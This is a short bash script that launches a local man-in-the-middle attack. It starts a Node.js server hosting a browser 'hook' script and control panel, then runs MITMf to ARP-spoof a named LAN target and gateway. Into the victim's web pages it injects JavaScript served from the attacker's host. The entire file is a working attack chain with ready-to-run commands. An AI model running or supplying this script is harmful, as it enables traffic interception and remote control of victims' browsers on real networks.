#!/bin/bash
echo "starting node server"
echo "control panel at http://localhost:5001/pnsmn/controlPanel/"
cd /root/Desktop/node/
gnome-terminal -x  node index.js
echo "pnsmn hook at http://localhost:5001/hook/pnsmn.js"
echo "launching MITMf"
echo "spoofing 192.168.0.102"
cd /root/MITMf
gnome-terminal -x python mitmf.py  --spoof --arp -i wlan0 --gateway 192.168.0.1 --target 192.168.0.102 --inject --js-url http://192.168.0.103:5001/public/pnsmn.js
echo "done"

